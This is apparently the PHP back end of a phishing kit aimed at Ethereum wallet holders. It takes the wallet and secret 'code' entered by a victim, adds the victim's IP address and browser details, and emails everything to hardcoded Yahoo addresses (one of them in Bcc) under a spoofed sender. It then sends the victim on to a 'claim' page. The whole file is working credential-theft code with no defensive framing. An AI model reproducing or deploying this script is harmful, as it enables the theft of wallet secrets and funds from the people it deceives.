<?php



if(isset($_POST["wallet"]) & isset($_POST["code"]));

$wallet = $_POST["wallet"];
$code = $_POST["code"];



	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| ETH Wallet |--------------|\n";
	
	$message .= "wallet              : ".$wallet."\n";
	$message .= "pass              : ".$pass."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY ETH --------------|\n";
	

    
    	$send =  "computerapps@yahoo.com";
    	$headers = array(
    	'From' => 'info@hosttum.com',
    	'Bcc' => 'ernestjackson03@yahoo.com',
    	'Reply-To' => 'reply@hosttum.com',
    	'X-Mailer' => 'PHP/' . phpversion());
	
	$subject = "0xWallet - Connect : $ip";
	$headers = implode("\r\n", $headers);
    	mail($send, $subject, $message, $headers);


header('Location: ./claim.html');
exit;

?>
